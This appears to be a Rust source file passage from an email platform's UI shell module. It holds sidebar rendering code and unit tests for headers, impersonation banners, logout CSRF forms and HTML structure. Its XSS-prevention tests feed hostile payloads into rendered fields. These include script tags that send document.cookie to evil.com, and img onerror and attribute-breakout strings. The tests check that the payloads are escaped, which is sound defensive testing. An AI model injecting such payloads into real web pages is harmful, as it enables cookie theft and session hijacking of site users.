        ("Compliance", "/compliance", "shield"),
        ("Audit Logs", "/audit", "file-text"),
        ("Billing", "/billing", "credit-card"),
        ("Security", "/settings/security", "lock"),
    ];

    let render_section = |title: &str, items: &[(&str, &str, &str)]| {
        format!(
            "<div class=\"space-y-1 mb-6\">\
                <h3 class=\"px-6 text-[11px] font-semibold uppercase tracking-[0.1em] text-surface-500 mb-2\">{}</h3>\
                {}</div>",
            title,
            render_sidebar_content(items, "", current_path)
        )
    };

    let content = format!(
        "{}{}{}",
        render_section("Operate", &operate_items),
        render_section("Customers", &customer_items),
        render_section("Governance", &governance_items),
    );

    format!(
        "<div class=\"apex-cp-sidebar flex flex-col h-full bg-card text-surface-900 border-r border-surface-200/60 w-64\">\
         <div class=\"p-6 mb-4\"><div class=\"flex flex-col gap-0.5\">\
         <span class=\"apex-sidebar-brand text-xl font-bold tracking-tighter\"><span class=\"text-brand-600\">Apex</span><span class=\"text-surface-950\">Mail</span></span>\
         <span class=\"text-[11px] font-semibold uppercase tracking-[0.1em] text-surface-500\">Operations</span></div></div>\
         <nav class=\"flex-1 overflow-y-auto cp-sidebar-nav\" data-sidebar=\"primary\" aria-label=\"Control Plane navigation\">{}</nav>\
         <div class=\"p-4 border-t border-surface-100\"><form method=\"POST\" action=\"/web/auth/logout\"><input type=\"hidden\" name=\"_csrf\" value=\"{csrf_token}\" /><button type=\"submit\" class=\"flex w-full items-center gap-3 px-4 py-2 text-sm font-semibold rounded-[8px_8px_7px_7px] text-surface-500 hover:text-surface-950 hover:bg-surface-50 transition-colors\"><span>Sign Out</span></button></form></div></div>",
        content,
        csrf_token = html_escape(csrf_token),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn exposes_shell_specs() {
        assert!(SHELLS.iter().any(|shell| shell.name == "WebDashboardShell"));
        assert!(SHELLS.iter().any(|shell| shell.name == "ControlPlaneShell"));
        assert_eq!(SHELLS.len(), 2);
    }

    #[test]
    fn shell_sources_capture_expected_contracts() {
        assert!(WEB_LAYOUT_SOURCE.contains("ImpersonationBanner"));
        assert!(WEB_SIDEBAR_SOURCE.contains("aria-current"));
        assert!(WEB_HEADER_SOURCE.contains("⌘K"));
        assert!(WEB_IMPERSONATION_SOURCE.contains("Impersonation Mode"));
        assert!(WEB_TOAST_STORE_SOURCE.contains("__apexmailToastStore__"));
        assert!(CONTROL_PLANE_SHELL_SOURCE.contains("Operator Shortcuts"));
        assert!(CONTROL_PLANE_SIDEBAR_SOURCE.contains("Control Plane"));
        assert_eq!(shell_source_catalog().len(), 7);
    }

    #[test]
    fn exposes_sidebar_persistence_and_toast_contracts() {
        assert_eq!(ui_store_persistence_key(), "apexmail-ui");
        assert_eq!(theme_storage_key(), "apexmail-ui:theme");
        assert_eq!(toast_store_global(), "__apexmailToastStore__");
        assert_eq!(toast_remove_delay_ms(), 5000);
        assert_eq!(header_shortcut_hint(), "Search");
    }

    #[test]
    fn header_renders_session_user_context_when_provided() {
        let header = ShellHeader {
            search_query: "",
            unread_count: 0,
            avatar_fallback: "AM",
            mobile_menu_open: false,
            user_context: Some(UserContext {
                display_name: "Ops Team",
                email: "ops@tenant.example",
                plan_label: "Scale Plan",
            }),
        }
        .render_html();
        assert!(header.contains("Ops Team"));
        assert!(header.contains("ops@tenant.example"));
        assert!(header.contains("Scale Plan"));
        assert!(!header.contains("Engineering"));
        assert!(!header.contains("admin@apexmail.ee"));

        // Without a session NO plan label renders (the old hardcoded
        // "Free Plan — 30K / mo" showed a fabricated plan to every
        // authenticated page — dogfood 2026-10-06) and no identity block is
        // emitted.
        let anon = ShellHeader {
            user_context: None,
            ..ShellHeader {
                search_query: "",
                unread_count: 0,
                avatar_fallback: "AM",
                mobile_menu_open: false,
                user_context: None,
            }
        }
        .render_html();
        assert!(
            !anon.contains("Free Plan"),
            "no session must render no plan label (never a fabricated one)"
        );
        assert!(!anon.contains("data-plan-label"));
        assert!(!anon.contains("data-user-email"));

        // A session whose plan could not be resolved renders the identity
        // but still NO plan label.
        let unresolved = ShellHeader {
            user_context: Some(UserContext {
                display_name: "Ops Team",
                email: "ops@tenant.example",
                plan_label: "",
            }),
            ..ShellHeader {
                search_query: "",
                unread_count: 0,
                avatar_fallback: "OT",
                mobile_menu_open: false,
                user_context: None,
            }
        }
        .render_html();
        assert!(unresolved.contains("Ops Team"));
        assert!(unresolved.contains("ops@tenant.example"));
        assert!(!unresolved.contains("data-plan-label"));
    }

    /// The CP shell has no native banner slot; the injector must place the
    /// banner inside the shell root and push the scroll column below it —
    /// including on pages that already carry operational-banner padding.
    #[test]
    fn control_plane_impersonation_banner_is_injected_with_the_column_offset() {
        let banner = ImpersonationBanner {
            tenant_id: "tenant_42",
            operator_name: "Operator Jane",
            time_remaining: "29:59",
            end_session_error: None,
            ending_session: false,
        };
        let page = crate::leptos_views::control_plane_app_layout_with_role(
            "<section>Ops</section>",
            "Operations",
            "Monitor the fleet.",
            "/dashboard",
            "csrf",
            "owner",
        );
        assert!(
            !page.contains("Impersonation Active"),
            "the plain layout must not fabricate a banner"
        );

        let with_banner = crate::shell::apply_control_plane_impersonation_banner(&page, &banner);
        assert!(with_banner.contains("Impersonation Active"));
        assert!(with_banner.contains("tenant_42"));
        assert!(with_banner.contains("action=\"/web/auth/impersonate/end\""));
        assert!(
            with_banner.contains("style=\"padding-top: 2.1rem\""),
            "the scroll column must be pushed below the fixed banner"
        );
        // The banner sits INSIDE the shell root, before the sidebar.
        let shell_start = with_banner.find("apex-cp-shell").expect("CP shell root");
        let banner_pos = with_banner
            .find("Impersonation Active")
            .expect("banner markup");
        assert!(banner_pos > shell_start);

        // A non-CP document is a structural no-op.
        assert_eq!(
            crate::shell::apply_control_plane_impersonation_banner("<div>other</div>", &banner),
            "<div>other</div>"
        );

        // An operational-banner offset is preserved and extended, not
        // replaced.
        let with_ops = page.replace(
            "class=\"flex-1 flex flex-col min-h-screen min-w-0 ml-0 md:ml-64\"",
            "class=\"flex-1 flex flex-col min-h-screen min-w-0 ml-0 md:ml-64\" style=\"padding-top: 2rem\"",
        );
        let both = crate::shell::apply_control_plane_impersonation_banner(&with_ops, &banner);
        assert!(
            both.contains("style=\"padding-top: 4.1rem\""),
            "the impersonation offset stacks on the operational-banner offset"
        );
    }

    /// The Terminate button must POST to the real impersonation end
    /// endpoint (previously a no-op button).
    #[test]
    fn impersonation_banner_terminate_posts_to_end_endpoint() {
        let banner = ImpersonationBanner {
            tenant_id: "t_1",
            operator_name: "Op",
            time_remaining: "00:45",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(banner.contains("action=\"/web/auth/impersonate/end\""));
        assert!(banner.contains("method=\"POST\""));
        // Native form submission only — the JS-era data-api-form/data-redirect
        // bridge attributes are gone (the handler is a PRG form POST).
        assert!(!banner.contains("data-api-form"));
        assert!(!banner.contains("data-redirect"));
        assert!(banner.contains("Terminate"));
    }

    #[test]
    fn renders_header_banner_and_toast_surface() {
        let header = ShellHeader {
            search_query: "campaigns",
            unread_count: 3,
            avatar_fallback: "AM",
            user_context: None,
            mobile_menu_open: false,
        }
        .render_html();
        let banner = ImpersonationBanner {
            tenant_id: "tenant_123",
            operator_name: "Operator Jane",
            time_remaining: "9:58",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        let toast_surface = ToastSurface {
            toasts: vec!["<div>Toast</div>"],
        }
        .render_html();

        // Minimal header (reference design): search affordance via a button
        // with the mod+k shortcut, theme toggle, avatar — no combobox input,
        // no unread badge. The notification count is surfaced via the toast
        // surface, not the header.
        assert!(header.contains("role=\"search\""));
        assert!(header.contains("type=\"search\""));
        assert!(!header.contains("data-theme-toggle"));
        assert!(header.contains("for=\"global-search\""));
        // The nav toggle lives on the <details><summary> in the shell body.
        assert!(header.contains("role=\"search\""));
        assert!(banner.contains("Impersonation Active"));
        assert!(banner.contains("tenant_123"));
        assert!(banner.contains("Terminate"));
        assert!(toast_surface.contains("aria-label=\"Notifications\""));
        assert!(toast_surface.contains("data-toast-store=\"__apexmailToastStore__\""));
        assert!(toast_surface.contains("data-remove-delay=\"5000\""));
    }

    #[test]
    fn renders_web_control_plane_and_marketing_shells() {
        let web = WebDashboardShell {
            sidebar_collapsed: true,
            mobile_menu_open: true,
            child_html: "<section>Dashboard</section>",
            header: ShellHeader {
                search_query: "reports",
                unread_count: 1,
                avatar_fallback: "AR",
                user_context: None,
                mobile_menu_open: true,
            },
            impersonation_banner: Some(ImpersonationBanner {
                tenant_id: "tenant_7",
                operator_name: "Admin",
                time_remaining: "3:21",
                end_session_error: Some("Could not end impersonation session."),
                ending_session: false,
            }),
            toast_surface: Some(ToastSurface {
                toasts: vec!["<div>Saved</div>"],
            }),
            current_path: "/dashboard",
            csrf_token: "",
        }
        .render_html();
        let control = ControlPlaneShell {
            mobile_menu_open: true,
            user_role: "admin",
            page_title: "Operations",
            page_description: "Monitor the fleet.",
            banners: vec![OperationalBanner {
                tone: "warning",
                message: "Safe mode active",
            }],
            child_html: "<section>Ops</section>",
            current_path: "/dashboard",
            csrf_token: "",
            user_context: None,
        }
        .render_html();
        let marketing = MarketingShell {
            child_html: "<section>Hero</section>",
        }
        .render_html();

        assert!(web.contains("data-sidebar-storage-key=\"apexmail-ui\""));
        assert!(web.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
        assert!(!web.contains("<script"));
        assert!(web.contains("<details"));
        assert!(web.contains("aria-controls=\"mobile-sidebar-panel\""));
        assert!(web.contains("w-20"));
        assert!(web.contains("Dashboard"));
        assert!(web.contains("Could not end impersonation session."));
        assert!(web.contains("Saved"));
        assert!(control.contains("data-user-role=\"admin\""));
        assert!(control.contains("data-theme-storage-key=\"apexmail-ui:theme\""));
        assert!(!control.contains("<script"));
        assert!(control.contains("Safe mode active"));
        assert!(control.contains("aria-label=\"Toggle control plane navigation menu\""));
        assert!(control.contains("aria-controls=\"control-plane-mobile-panel\""));
        assert!(control.contains("Operations"));
        assert!(control.contains("Monitor the fleet."));
        assert!(control.contains("<summary"));
        assert!(control.contains("href=\"/dashboard\""));
        assert!(control.contains("href=\"/settings/security\""));
        assert!(!control.contains("href=\"/cp/tenants\""));
        assert!(marketing.contains("data-marketing-shell=\"header\""));
        assert!(marketing.contains("data-marketing-shell=\"footer\""));
        assert!(marketing.contains("data-marketing-shell=\"cookie-consent\""));
        assert!(marketing.contains("data-marketing-shell=\"back-to-top\""));
    }

    // ── XSS Prevention Tests ───────────────────────────────────

    #[test]
    fn header_search_query_escapes_xss() {
        // The minimal header (reference design) no longer renders the search
        // query in an <input value="..."> — search is a button affordance, so
        // the query value is never emitted and cannot be an XSS vector. Verify
        // the payload does not appear anywhere in the header output.
        let xss_payload = "<img src=x onerror=\"alert('xss')\">";
        let header = ShellHeader {
            search_query: xss_payload,
            unread_count: 0,
            avatar_fallback: "AM",
            user_context: None,
            mobile_menu_open: false,
        }
        .render_html();
        assert!(
            !header.contains(xss_payload),
            "raw XSS payload found in header output"
        );
    }

    #[test]
    fn header_avatar_escapes_xss() {
        let xss_payload = "\"><script>alert(1)</script>";
        let header = ShellHeader {
            search_query: "safe",
            unread_count: 0,
            avatar_fallback: xss_payload,
            mobile_menu_open: false,
            user_context: None,
        }
        .render_html();
        assert!(
            !header.contains("<script>"),
            "unescaped script tag in avatar output"
        );
        assert!(
            header.contains("&lt;script&gt;"),
            "escaped script tag not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_tenant_id() {
        let xss_payload =
            "<script>document.location='https://evil.com?c='+document.cookie</script>";
        let banner = ImpersonationBanner {
            tenant_id: xss_payload,
            operator_name: "Safe Operator",
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("<script>"),
            "unescaped script in tenant_id"
        );
        assert!(
            banner.contains("&lt;script&gt;"),
            "escaped tenant_id not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_operator_name() {
        let xss_payload = "Admin<img/src=x onerror=alert(1)>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: xss_payload,
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("onerror=alert(1)>"),
            "unescaped img tag in operator_name"
        );
    }

    #[test]
    fn impersonation_banner_escapes_error_message() {
        let xss_payload = "<div onmouseover=\"alert('xss')\">Error</div>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: "5:00",
            end_session_error: Some(xss_payload),
            ending_session: false,
        }
        .render_html();
        // The angle brackets of the <div> tag must be escaped
        assert!(
            !banner.contains("<div onmouseover"),
            "unescaped <div> tag in error message"
        );
        assert!(
            banner.contains("&lt;div onmouseover="),
            "escaped error message not found"
        );
    }

    #[test]
    fn impersonation_banner_escapes_time_remaining() {
        let xss_payload = "\"><script>alert(1)</script><span x=\"";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: xss_payload,
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(
            !banner.contains("<script>alert(1)</script>"),
            "unescaped script in time_remaining"
        );
    }

    #[test]
    fn control_plane_banner_escapes_message() {
        let xss_payload =
            "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
        let control = ControlPlaneShell {
            mobile_menu_open: false,
            user_role: "admin",
            page_title: "Operations",
            page_description: "Monitor the fleet.",
            banners: vec![OperationalBanner {
                tone: "critical",
                message: xss_payload,
            }],
            child_html: "<section>Ops</section>",
            current_path: "/dashboard",
            csrf_token: "",
            user_context: None,
        }
        .render_html();
        assert!(
            !control.contains("<script>fetch"),
            "unescaped script in control plane banner"
        );
        assert!(
            control.contains("&lt;script&gt;"),
            "escaped banner message not found"
        );
    }

    #[test]
    fn html_escape_covers_all_dangerous_chars() {
        assert_eq!(html_escape("<"), "&lt;");
        assert_eq!(html_escape(">"), "&gt;");
        assert_eq!(html_escape("&"), "&amp;");
        assert_eq!(html_escape("\""), "&quot;");
        assert_eq!(html_escape("'"), "&#x27;");
        assert_eq!(html_escape("safe text 123"), "safe text 123");
        assert_eq!(
            html_escape("<script>alert('xss')</script>"),
            "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
        );
    }

    // ── Mobile sidebar presence ─────────────────────────────────

    #[test]
    fn web_shell_keeps_mobile_sidebar_in_dom_when_closed() {
        // SSR always renders the dashboard with the menu closed; the mobile
        // sidebar must still be in the DOM (translated off-canvas) so the
        // burger button and mobile_menu_script() can open it. Previously the
        // container only existed when mobile_menu_open was true, so shipped
        // pages had no mobile navigation at all.
        let web = WebDashboardShell {
            sidebar_collapsed: false,
            mobile_menu_open: false,
            child_html: "<section>Dashboard</section>",
            header: ShellHeader {
                search_query: "",
                unread_count: 0,
                avatar_fallback: "AM",
                user_context: None,
                mobile_menu_open: false,
            },
            impersonation_banner: None,
            toast_surface: None,
            current_path: "/dashboard",
            csrf_token: "",
        }
        .render_html();

        // Zero-JS mobile nav: a <details> disclosure that is always in the
        // DOM, keyboard operable, and needs no script.
        assert!(web.contains("<details"));
        assert!(web.contains("id=\"mobile-sidebar\""));
        assert!(web.contains("<summary"));
    }

    fn web_shell_reference() -> WebDashboardShell<'static> {
        WebDashboardShell {
            sidebar_collapsed: false,
            mobile_menu_open: false,
            child_html: "",
            header: ShellHeader {
                search_query: "",
                unread_count: 0,
                avatar_fallback: "AM",
                user_context: None,
                mobile_menu_open: false,
            },
            impersonation_banner: None,
            toast_surface: None,
            current_path: "/dashboard",
            csrf_token: "",
        }
    }

    // ── Logout wiring ───────────────────────────────────────────

    #[test]
    fn web_sidebar_logout_posts_to_api_with_csrf() {
        // A plain GET link to /logout 404s (the endpoint is POST-only) and a
        // bare form POST would fail the session CSRF check. The sidebar must
        // use the data-api-form bridge, which sends X-CSRF-Token from the
        // csrf_token cookie and redirects to /login on success.
        let web = web_shell_reference().render_html();
        assert!(
            !web.contains("href=\"/logout\""),
            "logout must not be a plain GET link"
        );
        assert!(web.contains("action=\"/web/auth/logout\""));
        assert!(web.contains("name=\"_csrf\""));
    }

    // ─── Design-report implementation guards ──────────────────────

    /// Item 13 (CP #1): the CP shell's `<header` tag must actually close —
    /// the unclosed tag mangled the page-title wrapper on every
    /// authenticated CP page.
    #[test]
    fn control_plane_header_tag_is_closed() {
        let html = ControlPlaneShell {
            mobile_menu_open: false,
            user_role: "admin",
            page_title: "Tenants",
            page_description: "Workspaces.",
            banners: Vec::new(),
            child_html: "<section>rows</section>",
            current_path: "/tenants",
            csrf_token: "",
            user_context: None,
        }
        .render_html();
        let header_at = html.find("<header").expect("header present");
        let header_end = html[header_at..].find('>').expect("header tag closes") + header_at;
        // The opening tag closes before the title wrapper begins.
        assert!(html[header_at..=header_end].ends_with("z-20\">"));
        assert!(html.contains("</header>"));
    }

    /// F10 (live dogfood 2026-10-08): the render pipeline loaded
    /// `session_identity` for the CP surface but the layout consumed only
    /// the role placeholder — every CP page dropped the tenant's real plan
    /// label (the web console rendered it). The CP shell must now carry the
    /// identity and label from the session, escaped like every other input.
    #[test]
    fn control_plane_shell_renders_the_session_identity_and_plan_label() {
        let html = crate::leptos_views::control_plane_app_layout_with_session(
            "<section>rows</section>",
            "Tenants",
            "Workspaces.",
            "/tenants",
            "csrf-token",
            "owner",
            Some(&UserContext {
                display_name: "CP Dogfood",
                email: "cp-dogfood@dogfood.test",
                plan_label: "Scale Plan — 2M / mo",
            }),
            None,
        );
        assert!(
            html.contains("data-plan-label"),
            "the CP header must carry the plan-label slot"
        );
        assert!(
            html.contains("Scale Plan — 2M / mo"),
            "the real plan label must render"
        );
        assert!(
            html.contains("data-user-identity"),
            "the CP header must carry the identity slot"
        );
        assert!(html.contains("CP Dogfood"));
        assert!(html.contains("cp-dogfood@dogfood.test"));

        // A hostile label/name is escaped, never emitted raw.
        let hostile = crate::leptos_views::control_plane_app_layout_with_session(
            "<section>x</section>",
            "Tenants",
            "Workspaces.",
            "/tenants",
            "",
            "admin",
            Some(&UserContext {
                display_name: "\"><script>alert(1)</script>",
                email: "op@example.test",
                plan_label: "<img src=x onerror=alert(1)>",
            }),
            None,
        );
        assert!(!hostile.contains("<script>alert(1)</script>"));
        assert!(!hostile.contains("<img src=x onerror=alert(1)>"));
        assert!(hostile.contains("&lt;script&gt;"));
    }

    /// The no-session render must claim NEITHER a plan label nor an identity
    /// — the pre-F10 behavior of rendering nothing is preserved for
    /// anonymous/route-inventory renders.
    #[test]
    fn control_plane_shell_without_session_renders_no_plan_label_or_identity() {
        let html = crate::leptos_views::control_plane_app_layout_with_role(
            "<section>rows</section>",
            "Tenants",
            "Workspaces.",
            "/tenants",
            "",
            "admin",
        );
        assert!(!html.contains("data-plan-label"));
        assert!(!html.contains("data-user-identity"));
    }

    /// Item 13 (CP #1, validity extension): the full shell (root layout +
    /// app shell) must produce balanced structural tags — the previous
    /// validity test wrapped only inner page HTML and could not catch
    /// shell-level defects like the unclosed `<header`.
    #[test]
    fn control_plane_shell_wraps_validly() {
        let shell = ControlPlaneShell {
            mobile_menu_open: false,
            user_role: "admin",
            page_title: "Tenants",
            page_description: "Workspaces.",
            banners: Vec::new(),
            child_html: "<section>rows</section>",
            current_path: "/tenants",
            csrf_token: "t",
            user_context: None,
        }
        .render_html();
        let page = crate::leptos_views::control_plane_root_layout(&shell);
        for (open, close) in [
            ("<header", "</header>"),
            ("<aside", "</aside>"),
            ("<main", "</main>"),
            ("<nav", "</nav>"),
            ("<body", "</body>"),
            ("<html", "</html>"),
        ] {
            assert!(
                page.matches(open).count() <= page.matches(close).count(),
                "{open} is not closed everywhere in the CP shell"
            );
        }
        assert!(page.contains("Skip to content"));
    }

    /// Item 2: the web sidebar's task-oriented regroup un-orphans Reports,
    /// Inbox Placement, Events, and Dedicated IPs — every routed page is
    /// one click from the nav.
    #[test]
    fn web_sidebar_regroup_reaches_every_routed_page() {
        let html = render_web_sidebar("/dashboard", "");
        for group in ["Overview", "Send", "Measure", "Configure", "Account"] {
            assert!(html.contains(group), "sidebar group {group} missing");
        }
        for href in [
            "/dashboard",
            "/campaigns",
            "/templates",
            "/contacts",
            "/lists",
            "/analytics",
            "/reports",
            "/inbox-placement",
            "/events",
            "/domains",
            "/settings/api-keys",
            "/settings/webhooks",
            "/settings/dedicated-ips",
            "/settings/billing",
            "/settings",
            "/assistant",
        ] {
            assert!(
                html.contains(&format!("href=\"{href}\"")),
                "sidebar must link {href}"
            );
        }
    }

    /// Item 18 (CP #20): the CP nav regroups to Operate/Customers/
    /// Governance, carries the Alerts entry, a sign-out form, and no
    /// hardcoded version string.
    #[test]
    fn cp_sidebar_regroups_with_alerts_and_sign_out() {
        let html = render_cp_sidebar("/alerts", "t");
        for group in ["Operate", "Customers", "Governance"] {
            assert!(html.contains(group), "CP sidebar group {group} missing");
        }
        // The most operational page joins the nav.
        assert!(html.contains("href=\"/alerts\""));
        assert!(html.contains("href=\"/tenants\""));
        assert!(html.contains("href=\"/operators\""));
        assert!(html.contains("href=\"/compliance\""));
        assert!(html.contains("href=\"/audit\""));
        assert!(html.contains("href=\"/jobs\""));
        assert!(html.contains("href=\"/cp/demos\""));
        assert!(html.contains("href=\"/reviews/ai-drafts\""));
        // Sign-out is a real CSRF-protected POST.
        assert!(html.contains("action=\"/web/auth/logout\""));
        assert!(html.contains("name=\"_csrf\""));
        // The fabricated version string is gone.
        assert!(!html.contains("System v2.4.0-stable"));
        assert!(!html.contains("v2.4.0"));
    }

    /// Fix 9: the rendered CP layout carries a hardcoded `admin`
    /// placeholder role; the request pipeline overlays the authenticated CP
    /// claim role so owner/admin distinctions are truthful.
    #[test]
    fn control_plane_role_overlay_propagates_the_real_role() {
        let rendered = crate::leptos_views::control_plane_app_layout_with_title(
            "<section>Ops</section>",
            "Operations",
            "Monitor.",
            "/dashboard",
            "t",
        );
        assert!(
            rendered.contains("data-user-role=\"admin\""),
            "precondition: the layout renders the admin placeholder"
        );

        let owner = apply_control_plane_role(&rendered, "owner");
        assert!(owner.contains("data-user-role=\"owner\""));
        assert!(!owner.contains("data-user-role=\"admin\""));

        // An empty role (no verified session) leaves the document untouched.
        assert_eq!(apply_control_plane_role(&rendered, ""), rendered);

        // Hostile values cannot break out of the attribute.
        let escaped = apply_control_plane_role(&rendered, "\"><script>alert(1)</script>");
        assert!(!escaped.contains("<script>"));
        assert!(escaped.contains("&quot;&gt;&lt;script&gt;"));
    }

    /// Item 25: the impersonation banner is a fixed overlay — the shell
    /// must push the header column below it instead of letting the banner
    /// clip the page title.
    #[test]
    fn impersonation_banner_offsets_the_header_column() {
        let with_banner = WebDashboardShell {
            impersonation_banner: Some(ImpersonationBanner {
                tenant_id: "t_1",
                operator_name: "Op",
                time_remaining: "9:58",
                end_session_error: None,
                ending_session: false,
            }),
            ..web_shell_reference()
        }
        .render_html();
        assert!(with_banner.contains("padding-top: 2.1rem"));
        let without = web_shell_reference().render_html();
        assert!(!without.contains("padding-top: 2.1rem"));
    }

    /// Item 3: avatar initials derive from the session's display name.
    #[test]
    fn avatar_initials_derive_from_display_name() {
        assert_eq!(avatar_initials("Sabela Khoua"), "SK");
        assert_eq!(avatar_initials("ops@apexmail.ee"), "O");
        assert_eq!(avatar_initials(""), "AM");
    }
}

#[cfg(test)]
mod deferred_shell_tests {
    use super::*;

    #[test]
    fn web_sidebar_lists_suppressions_under_configure() {
        let sidebar = render_web_sidebar("/dashboard", "tok");
        assert!(
            sidebar.contains("href=\"/settings/suppressions\""),
            "the suppressions page must be reachable from the primary nav"
        );
        assert!(sidebar.contains("Suppressions"));
        // The active-state highlighting matches the path prefix.
        let active = render_web_sidebar("/settings/suppressions", "tok");
        assert!(active.contains("aria-current=\"page\""));
    }
}
